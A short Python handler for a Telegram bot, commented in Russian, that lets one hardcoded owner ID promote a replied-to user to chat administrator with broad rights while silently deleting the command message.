from telegram import Update
from telegram.ext import ContextTypes

OWNER_ID = 7434161409


async def owner_command(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):

    message = update.message

    # Только ты можешь использовать команду
    if update.effective_user.id != OWNER_ID:
        try:
            await message.delete()
        except:
            pass
        return

    # Команда должна быть ответом
    if not message.reply_to_message:
        try:
            await message.delete()
        except:
            pass
        return

    target = message.reply_to_message.from_user

    try:
        # удаляем команду
        await message.delete()
    except:
        pass

    # Нельзя назначить самого бота
    if target.id == context.bot.id:
        return

    try:
        await context.bot.promote_chat_member(
            chat_id=update.effective_chat.id,
            user_id=target.id,

            can_manage_chat=True,
            can_delete_messages=True,
            can_manage_video_chats=True,
            can_restrict_members=True,
            can_promote_members=True,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True,
        )

        print(f"ADMIN GRANTED -> {target.id}")

    except Exception as e:
        print("OWNER ERROR:", e)
